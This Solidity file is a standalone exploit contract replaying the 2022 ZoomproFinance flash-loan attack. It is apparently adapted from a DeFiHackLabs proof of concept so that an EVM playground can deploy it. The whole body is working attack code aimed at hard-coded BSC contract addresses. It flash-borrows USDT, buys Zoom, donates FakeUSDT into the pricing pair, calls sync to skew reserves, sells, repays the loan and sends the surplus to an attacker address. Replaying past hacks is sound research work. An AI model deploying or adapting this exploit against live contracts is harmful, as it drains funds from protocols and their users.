// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

// Synthetic standalone exploit for the EVM Playground (2022-09-ZoomproFinance).
//
// The DeFiHackLabs PoC runs the attack INLINE in the Foundry test contract
// (the flash-loan `pancakeCall` callback lives on the test itself, so there is
// no standalone contract to deploy). This contract is a faithful, self-contained
// copy of that inline attack (testExploit + pancakeCall) so the playground can
// deploy it and record run(). Logic and constants are copied verbatim from
// test/ZoomproFinance_exp.sol.
//
// Root cause: the FakeUSDT/Zoom pair prices Zoom purely from spot reserves, and
// the quote asset (FakeUSDT) is freely mintable/donatable into the pricing pair
// via the Batch token's permissionless batchToken(). The attacker flash-borrows
// USDT, buys Zoom, donates 1,000,000 FakeUSDT straight into the pair + sync() to
// inflate the quote-side reserve, then dumps the Zoom back for more USDT than
// the buy cost — pocketing the reserve-skew surplus after repaying the flash loan.

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
    function transfer(address, uint256) external returns (bool);
}

interface IPancakePair {
    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external;
}

interface IRouter {
    function buy(uint256) external;
    function sell(uint256) external;
}

interface IUSD {
    function batchToken(address[] calldata _addr, uint256[] calldata _num, address token) external;
    function sync() external;
}

contract ZoomproFinanceDrain {
    address constant ATTACKER = 0xC578d755Cd56255d3fF6E92E1B6371bA945e3984;
    address constant USDT = 0x55d398326f99059fF775485246999027B3197955;
    address constant ZOOM = 0x9CE084C378B3E65A164aeba12015ef3881E0F853;
    address constant SWAP = 0x5a9846062524631C01ec11684539623DAb1Fae58;
    address constant BATCH = 0x47391071824569F29381DFEaf2f1b47A4004933B;
    address constant FUSDT = 0x62D51AACb079e882b1cb7877438de485Cba0dD3f;
    address constant PP = 0x1c7ecBfc48eD0B34AAd4a9F338050685E66235C5; // FakeUSDT/Zoom pair
    IPancakePair constant PANCAKE_PAIR = IPancakePair(0x7EFaEf62fDdCCa950418312c6C91Aef321375A00); // KIMO/WBNB flash pair

    IERC20 constant usdt = IERC20(USDT);
    IERC20 constant zoom = IERC20(ZOOM);

    // step 0: flash-borrow 3,000,000 USDT from the KIMO/WBNB pair; the callback
    // does the buy → donate → sync → sell → repay.
    function run() external {
        PANCAKE_PAIR.swap(3_000_000_000_000_000_000_000_000, 0, address(this), new bytes(1));
        // forward any leftover USDT profit to the attacker EOA
        usdt.transfer(ATTACKER, usdt.balanceOf(address(this)));
    }

    function pancakeCall(address, uint256, uint256, bytes calldata) external {
        uint256 ba = usdt.balanceOf(address(this));
        usdt.approve(SWAP, 100_000_000_000_000_000_000_000_000_000_000_000_000);

        // use usdt to swap zoom
        IRouter(SWAP).buy(ba);

        // donate 1,000,000 FakeUSDT straight into the pricing pair
        address[] memory n1 = new address[](1);
        n1[0] = PP;
        uint256[] memory n2 = new uint256[](1);
        n2[0] = 1_000_000 ether;
        IUSD(BATCH).batchToken(n1, n2, FUSDT);

        // calling pair FakeUSDT-Zoom sync() to lock in the skewed reserves
        IUSD(PP).sync();

        uint256 baz = zoom.balanceOf(address(this));
        zoom.approve(SWAP, baz * 100);
        IRouter(SWAP).sell(baz);

        // repay flashloan (borrowed × 10030 / 10000)
        usdt.transfer(address(PANCAKE_PAIR), (ba * 10_030) / 10_000);
    }

    receive() external payable {}
}
